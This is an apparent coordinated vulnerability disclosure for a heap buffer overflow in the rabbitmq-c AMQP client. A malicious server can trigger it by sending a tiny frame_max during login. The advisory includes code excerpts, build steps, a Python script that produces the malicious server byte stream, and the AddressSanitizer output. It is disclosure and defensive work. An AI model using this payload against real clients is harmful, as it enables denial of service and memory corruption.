<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-D7FC4YDQ -->

# ANT-2026-D7FC4YDQ · rabbitmq-c

## heap-buffer-overflow high

[CVE-2026-44236](https://nvd.nist.gov/vuln/detail/CVE-2026-44236)

Claude critical
Maintainer -

Claude Opus 4.6

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.

# ANT-2026-D7FC4YDQ: Heap-buffer-overflow in rabbitmq-c

libFuzzer replayed a single PoC input against the fuzz\_server target and the process terminated with EXIT\_CODE:1. No AddressSanitizer, UBSan, or other crash diagnostics were printed, and no stack frames or source locations are available, so the crash type, faulting function, and access shape cannot be determined from this output alone.

**Project:** rabbitmq-c
**Location:** `librabbitmq/amqp_connection.c:amqp_tune_connection (missing minimum frame_max check; overflow write occurs in amqp_frame_to_bytes)`

The fuzz\_server harness exited with code 1 when replaying the provided PoC input; no sanitizer report or stack trace was emitted.

**Crash trace:**

```
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2008757616
INFO: Loaded 1 modules   (2985 inline 8-bit counters): 2985 [0x5bd5cae62d00, 0x5bd5cae638a9),
INFO: Loaded 1 PC tables (2985 PCs): 2985 [0x5bd5cae638b0,0x5bd5cae6f340),
/out/fuzz_server: Running 1 inputs 1 time(s) each.
Running: /tmp/poc
EXIT_CODE:1
```

Reproduce against the target as described under Technical Details.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-D7FC4YDQ.

---

**Reference:** ANT-2026-D7FC4YDQ

Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer.

### Summary

A malicious AMQP server can trigger a heap buffer overflow in a rabbitmq-c client during the normal `amqp_login()` handshake.

The server sends a `connection.tune` frame with an invalid small `frame_max` value, such as `1`. rabbitmq-c accepts this value, reallocates its outbound frame buffer to 1 byte, then immediately serializes a `connection.tune-ok` response into that buffer. This writes past the heap allocation.

The issue is remotely triggerable by a server the victim client connects to, or by an on-path attacker against plaintext AMQP traffic. The practical impact is client-side memory corruption and likely denial of service. Code execution is possible in theory but not demonstrated.

### Details

In `amqp_login_inner()` in `librabbitmq/amqp_socket.c`, rabbitmq-c accepts the server-provided `frame_max` if it is smaller than the client's requested value:

```
if (server_frame_max != 0 && server_frame_max < client_frame_max) {
  client_frame_max = server_frame_max;
```

The value is then passed to `amqp_tune_connection()`:

```
res = amqp_tune_connection(state, client_channel_max, client_frame_max,
                           client_heartbeat);
```

In `librabbitmq/amqp_connection.c`, `amqp_tune_connection()` uses `frame_max` directly as the outbound buffer size:

```
state->outbound_buffer.len = frame_max;
newbuf = realloc(state->outbound_buffer.bytes, frame_max);
```

There is no minimum size check. If the server sends `frame_max = 1`, the outbound buffer becomes 1 byte.

The client then sends `connection.tune-ok`:

```
res = amqp_send_method_inner(state, 0, AMQP_CONNECTION_TUNE_OK_METHOD, &s,
                             AMQP_SF_NONE, deadline);
```

This reaches `amqp_frame_to_bytes()`, which writes the AMQP frame header into the outbound buffer:

```
amqp_e8(frame->frame_type, amqp_offset(out_frame, 0));
amqp_e16(frame->channel, amqp_offset(out_frame, 1));
```

With a 1-byte buffer, the 2-byte write at offset 1 overflows the heap allocation.

rabbitmq-c documents the minimum AMQP frame size as 4096 bytes (`AMQP_FRAME_MIN_SIZE`). The server-controlled `frame_max` should be rejected or clamped if it is below that value.

### PoC

Tested against rabbitmq-c commit:

```
8b7471eab8d09536b3c104dbb30a65699cf48104
```

Build rabbitmq-c with ASAN and the existing `fuzz_server` harness:

```
git clone https://github.com/alanxz/rabbitmq-c.git /tmp/rabbitmq-c-src
cd /tmp/rabbitmq-c-src
git checkout 8b7471eab8d09536b3c104dbb30a65699cf48104

cmake -S . -B build-asan \
  -DCMAKE_C_COMPILER=clang \
  -DCMAKE_C_FLAGS="-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined -fsanitize=fuzzer-no-link" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
  -DBUILD_STATIC_LIBS=ON \
  -DBUILD_SHARED_LIBS=OFF \
  -DBUILD_OSSFUZZ=OFF \
  -DBUILD_EXAMPLES=OFF \
  -DBUILD_TOOLS=OFF \
  -DENABLE_SSL_SUPPORT=OFF

cmake --build build-asan -j"$(nproc)"

clang -g -O1 -fno-omit-frame-pointer \
  -fsanitize=address,undefined,fuzzer \
  -DHAVE_CONFIG_H -DAMQP_STATIC \
  -I include -I build-asan/include \
  -I librabbitmq -I build-asan/librabbitmq \
  fuzz/fuzz_server.c build-asan/librabbitmq/librabbitmq.a \
  -lpthread -lrt \
  -o build-asan/fuzz_server
```

Create the malicious AMQP server response stream:

```
python3 - <<'PY'
from pathlib import Path

poc = bytes.fromhex(
    "01 00 00 00 00 00 1c"
    "00 0a 00 0a"
    "00 09"
    "00 00 00 00"
    "00 00 00 05 50 4c 41 49 4e"
    "00 00 00 05 65 6e 5f 55 53"
    "ce"
    "01 00 00 00 00 00 0c"
    "00 0a 00 1e"
    "00 00"
    "00 00 00 01"
    "00 00"
    "ce"
)

Path("/tmp/rabbitmq-c-frame-max-poc.bin").write_bytes(poc)
PY
```

Run the PoC:

```
ASAN_OPTIONS="detect_leaks=0:halt_on_error=1:print_stacktrace=1" \
  ./build-asan/fuzz_server /tmp/rabbitmq-c-frame-max-poc.bin
```

Expected result:

```
 ==2445162==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x71826b1e0051 at pc 0x5fd54ef9476b bp 0x7ffe3ce43060 sp 0x7ffe3ce43058 WRITE of size 2 at 0x71826b1e0051 thread T0
      #0 0x5fd54ef9476a in amqp_e16 /tmp/rabbitmq-c-src/librabbitmq/amqp_private.h:227:3
      #1 0x5fd54efc2686 in amqp_frame_to_bytes /tmp/rabbitmq-c-src/librabbitmq/amqp_connection.c:438:3
      #2 0x5fd54efc1404 in amqp_send_frame_inner /tmp/rabbitmq-c-src/librabbitmq/amqp_connection.c:525:9
      #3 0x5fd54ef8ade4 in amqp_send_method_inner /tmp/rabbitmq-c-src/librabbitmq/amqp_socket.c:996:10
      #4 0x5fd54ef8a9cc in amqp_login_inner /tmp/rabbitmq-c-src/librabbitmq/amqp_socket.c:1396:11
      #5 0x5fd54ee86a2f in amqp_login /tmp/rabbitmq-c-src/librabbitmq/amqp_socket.c:1444:9
      #6 0x5fd54ee6e663 in client /tmp/rabbitmq-c-src/fuzz/fuzz_server.c:149:3
      #7 0x5fd54ee74921 in LLVMFuzzerTestOneInput /tmp/rabbitmq-c-src/fuzz/fuzz_server.c:117:3
```

The allocation trace shows the outbound buffer was resized to 1 byte in `amqp_tune_connection()` before the overflow.

### Impact

This is a remotely triggerable heap buffer overflow in rabbitmq-c clients and an attacker can trigger it before authentication by operating a malicious AMQP server and waiting for a victim application to connect. An on-path attacker can also trigger it when the victim uses plaintext AMQP.

Impacted users are applications that use rabbitmq-c to connect to AMQP servers. The most realistic impact is client-side denial of service or process abort under hardened allocators/sanitizers. The bug is memory corruption, so code execution may be possible depending on allocator behavior and heap layout, but this was not demonstrated.

**Background of that issue**
This bug was found as a part of an Anthropic research into the use of large language models for automated vulnerability discovery in open source software. Anthropic then engaged Trail of Bits to independently triage and validate those issues.

ADVISORY

<https://github.com/alanxz/rabbitmq-c/commit/4777d0b5c58cb02966a04a85832436bd66ed5d1f>

1. 2026-03-24
2. 2026-04-29
3. 2026-04-29
4. 2026-05-07
5. 2026-07-21

a8fc7febc53a5a1d71969c3c56575afd86f1df219e4aa2419b9304057bc1018433ef6f931061fce3ac051fd2e2c8a7dda48ac82900155f85aa45ea0d3d352176

Committed 2026-04-29 07:04 UTC

Revealed 2026-07-21 05:21 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-D7FC4YDQ%22%2C%22bug_class%22%3A%22Heap-buffer-overflow%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-24T18%3A45%3A36%2B00%3A00%22%2C%22description%22%3A%22libFuzzer%20replayed%20a%20single%20PoC%20input%20against%20the%20fuzz_server%20target%20and%20the%20process%20terminated%20with%20EXIT_CODE%3A1.%20No%20AddressSanitizer%2C%20UBSan%2C%20or%20other%20crash%20diagnostics%20were%20printed%2C%20and%20no%20stack%20frames%20or%20source%20locations%20are%20available%2C%20so%20the%20crash%20type%2C%20faulting%20function%2C%20and%20access%20shape%20cannot%20be%20determined%20from%20this%20output%20alone.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22rabbitmq-c%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3Anull%2C%22title%22%3A%22Heap-buffer-overflow%20in%20rabbitmq-c%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-D7FC4YDQ",
  "bug_class": "Heap-buffer-overflow",
  "claude_severity": "critical",
  "created_at": "2026-03-24T18:45:36+00:00",
  "description": "libFuzzer replayed a single PoC input against the fuzz_server target and the process terminated with EXIT_CODE:1. No AddressSanitizer, UBSan, or other crash diagnostics were printed, and no stack frames or source locations are available, so the crash type, faulting function, and access shape cannot be determined from this output alone.",
  "location": null,
  "project": "rabbitmq-c",
  "technical_details": null,
  "title": "Heap-buffer-overflow in rabbitmq-c",
```
